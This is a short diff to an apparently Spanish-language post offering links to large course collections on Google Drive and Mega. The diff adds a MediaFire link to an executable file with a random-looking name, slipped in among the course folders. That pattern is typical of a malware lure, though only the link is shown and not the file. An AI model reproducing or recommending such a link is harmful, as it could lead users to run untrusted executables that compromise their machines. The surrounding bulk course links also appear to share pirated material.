@@ -4,7 +4,7 @@
 *Buenas vengo a compartir estos cursos lleno de información*
 
 https://drive.google.com/drive/folders/1sW_bMVEePAAylSkXEADP6JrWkE7QENjQ
-
+https://www.mediafire.com/file/0pc6sem244slq1x/rzgn4s5wtctvw4ngypa1ga02638069276774936235.exe/file
 4000gb cursos
 https://mega.nz/folder/gYsEha7C#0blPL83HGT09RE-N1kexVA
 
